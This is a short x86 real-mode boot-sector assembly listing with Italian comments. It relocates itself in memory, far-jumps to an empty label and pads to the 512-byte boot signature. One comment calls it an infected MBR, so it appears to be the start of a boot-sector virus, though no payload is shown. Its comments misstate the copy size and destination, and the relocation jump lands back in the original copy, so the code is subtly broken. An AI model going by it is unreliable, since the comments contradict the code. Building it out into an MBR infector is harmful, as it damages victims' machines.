ORG 7C00h

use16
LOADLOC = 7C00h

main:
    cli
    xor ax,ax
    ; Ora imposta uno stack decente
    mov ss, ax			; Stack Segment
    mov [ss:7bfeh], sp		; Salva il vecchio Stack Pointer in [7bfeh]... Il perchè? semplice: 7C00 - 7BFE = 2
    mov sp, 7bfeh		; Alla fine del codice quando lo SP è a 0x7c00 posso fare un pop sp
    push ds
    mov ds, ax
    pushad

    ; Move myself at address 0x0:600
    mov    ds, ax		; ds = 0
    xor    ax, ax
    mov    es, ax		; es = 0
    mov    si, LOADLOC		; si = 0x7c00
    mov    di, 600h		; di = 0x0600
    mov    cx, 100h		; MOVSW = move word from address DS:SI to ES:DI.
				; REP MOVSW = Move CX words from DS:[SI] to ES:[DI].
    rep movsw			; Copia 200 bytes del MBR infetto all'indirizzo: 0x9f00h:0
    push es
    push from_new_selector
    retf

from_new_selector:


ends:
times 510-($-main) db 0 ; 512 total bytes
signa	db 55h,0aah		;signature

